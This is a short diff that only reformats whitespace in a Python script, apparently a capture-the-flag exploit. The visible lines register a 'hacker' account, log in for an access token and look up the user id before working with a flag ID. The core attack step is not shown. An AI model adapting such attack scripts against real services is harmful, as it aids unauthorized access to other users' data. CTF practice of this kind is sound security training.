@@ -14,15 +14,15 @@ def main():
     api_url = f"http://{IP}:{PORT}/"
     hacker_username = f'hac3r{uuid.uuid4()}'
     hacker_password = f'hah-{uuid.uuid4()}'
-    requests.post(api_url + 'auth/register/',json={
+    requests.post(api_url + 'auth/register/', json={
         'username': hacker_username,
         'password': hacker_password
     })
-    hacker_token = requests.post(api_url + 'auth/login/',json={
+    hacker_token = requests.post(api_url + 'auth/login/', json={
         'username': hacker_username,
         'password': hacker_password
     }).json()['accessToken']
-    hacker_id = requests.get(f'{api_url}users/{urllib.parse.quote_plus(hacker_username)}/' ,headers={
+    hacker_id = requests.get(f'{api_url}users/{urllib.parse.quote_plus(hacker_username)}/', headers={
         'x-access-token': hacker_token
     }).json()['id']
     name = PUBLIC_FLAG_ID.upper().lower()
@@ -50,4 +50,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
